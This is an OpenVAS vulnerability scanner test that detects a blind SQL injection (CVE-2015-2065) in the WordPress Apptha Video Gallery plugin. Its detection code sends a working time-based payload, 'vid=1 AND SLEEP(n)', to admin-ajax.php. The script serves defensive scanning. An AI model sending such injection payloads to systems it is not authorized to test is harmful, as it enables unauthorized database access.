###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Apptha Video Gallery Blind SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805161");
  script_version("2023-03-01T10:20:04+0000");
  script_cve_id("CVE-2015-2065");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:04 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"creation_date", value:"2015-04-08 17:11:05 +0530 (Wed, 08 Apr 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("WordPress Apptha Video Gallery Blind SQL Injection Vulnerability");

  script_tag(name:"summary", value:"WordPress Apptha Video Gallery is prone to blind sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the videogalleryrss.php
  script, as called by an rss action in the wp-admin/admin-ajax.php script,
  not properly sanitizing user-supplied input to the 'vid' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress Apptha Video Gallery
  (contus-video-gallery) plugin version before 2.8");

  script_tag(name:"solution", value:"Update to version 2.8 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130371");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36058");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/contus-video-gallery/changelog");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

wait_extra_sec = 5;

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/contus-video-gallery/videogalleryrss.php";
res = http_get_cache(item:url, port:port);

if(res =~ "^HTTP/1\.[01] 200" && "videogallery" >< res)
{
  # Added Multiple times, to make sure its working properly
  sleep = make_list(0, 1);

  # Use sleep time to check we are able to execute command
  foreach sec (sleep)
  {
    url = dir + "/wp-admin/admin-ajax.php?action=rss&type="
              + "video&vid=1%20AND%20SLEEP(" + sec + ")";

    req = http_get(item:url, port:port);
    start = unixtime();
    res = http_keepalive_send_recv(port:port, data:req);
    stop = unixtime();

    time_taken = stop - start;
    if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(99);
  }
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
